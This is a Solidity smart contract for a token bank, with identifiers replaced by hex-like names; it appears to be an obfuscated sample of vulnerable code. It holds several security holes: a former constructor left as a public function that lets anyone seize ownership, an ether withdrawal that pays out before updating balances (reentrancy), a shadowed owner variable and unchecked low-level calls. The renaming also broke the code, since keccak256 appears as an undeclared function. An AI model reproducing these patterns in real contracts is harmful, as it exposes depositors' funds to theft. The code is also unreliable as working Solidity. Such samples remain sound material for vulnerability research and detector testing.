// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract Ownable
{
    address _0x992583;
    address _0x760e9f = msg.sender;

    function _0x4c08b0(address _0x499a74)
    public
    _0x251182
    {
        _0x992583 = _0x499a74;
    }

    function _0xa09f69()
    public
    {
        if(msg.sender==_0x992583)
        {
            _0x760e9f=_0x992583;
        }
    }

    modifier _0x251182
    {
        if(_0x760e9f == msg.sender)_;
    }
}

contract Token is Ownable
{
    address _0x760e9f = msg.sender;
    function WithdrawToken(address _0x20fe8f, uint256 _0x4322a0,address _0xf59dfe)
    public
    _0x251182
    {
        _0x20fe8f.call(bytes4(_0x5ea72a("transfer(address,uint256)")),_0xf59dfe,_0x4322a0);
    }
}

contract TokenBank is Token
{
    uint public MinDeposit;
    mapping (address => uint) public Holders;

     ///Constructor
    function _0x0ff9bf()
    public
    {
        _0x760e9f = msg.sender;
        MinDeposit = 1 ether;
    }

    function()
    payable
    {
        Deposit();
    }

    function Deposit()
    payable
    {
        if(msg.value>MinDeposit)
        {
            Holders[msg.sender]+=msg.value;
        }
    }

    function WitdrawTokenToHolder(address _0xe0cea4,address _0xf23ea7,uint _0x7638ea)
    public
    _0x251182
    {
        if(Holders[_0xe0cea4]>0)
        {
            Holders[_0xe0cea4]=0;
            WithdrawToken(_0xf23ea7,_0x7638ea,_0xe0cea4);
        }
    }

    function WithdrawToHolder(address _0x2feb64, uint _0xbdaef9)
    public
    _0x251182
    payable
    {
        if(Holders[_0x2feb64]>0)
        {
            if(_0x2feb64.call.value(_0xbdaef9)())
            {
                Holders[_0x2feb64]-=_0xbdaef9;
            }
        }
    }
}